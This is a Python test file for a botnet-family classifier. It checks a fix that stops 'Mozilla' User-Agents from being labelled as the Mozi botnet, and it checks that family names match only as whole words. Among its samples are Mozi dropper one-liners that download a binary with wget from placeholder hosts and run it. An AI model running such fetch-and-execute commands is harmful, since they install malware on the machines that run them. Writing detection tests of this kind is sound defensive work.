"""botnetcls family-signature contract.

Regression for the 2026-06-05 bug: `re.compile(r"MOZI", re.IGNORECASE)`
matched "Mozi" inside "Mozilla", mislabeling 356,157 browser/zgrab User-Agent
HTTP requests as the Mozi botnet (the report's #1 "family"). The multi-AI
threat panel flagged Mozi as over-attributed; this pins the fix.
"""
from __future__ import annotations

import botnetcls


def _family_of(text: str):
    """First family whose compiled signature matches `text` (mirrors run())."""
    for rx, family, _desc in botnetcls._COMPILED_SIGS:
        if rx.search(text):
            return family
    return None


def test_mozilla_user_agent_is_not_mozi():
    for ua in [
        "GET / HTTP/1.1 Host: x User-Agent: Mozilla/5.0 (Linux; Android 4.0.3)",
        "POST /ipp HTTP/1.1 User-Agent: Mozilla/5.0 zgrab/0.x",
        "User-Agent: mozilla/5.0",  # lowercase too
    ]:
        assert _family_of(ua) != "mozi", f"Mozilla UA misclassified as mozi: {ua!r}"


def test_real_mozi_droppers_still_match():
    for s in [
        "cd /tmp; wget http://1.2.3.4/Mozi.m; chmod +x Mozi.m; ./Mozi.m",
        "wget http://x/Mozi.a -O- | sh",
        "Mozi",  # standalone binary marker
    ]:
        assert _family_of(s) in ("mozi", "mirai_dropper"), \
            f"real Mozi marker not matched: {s!r}"
    # the dropper-with-filename must specifically resolve to mozi when no
    # earlier (mirai_dropper) rule pre-empts it
    assert _family_of("fetch Mozi.m and run") == "mozi"


def test_bare_family_names_are_word_bounded():
    # none of the bare-name markers should fire on an embedding substring
    assert _family_of("satorimind blog") != "satori"
    assert _family_of("tsunamic wave generator") != "tsunami"
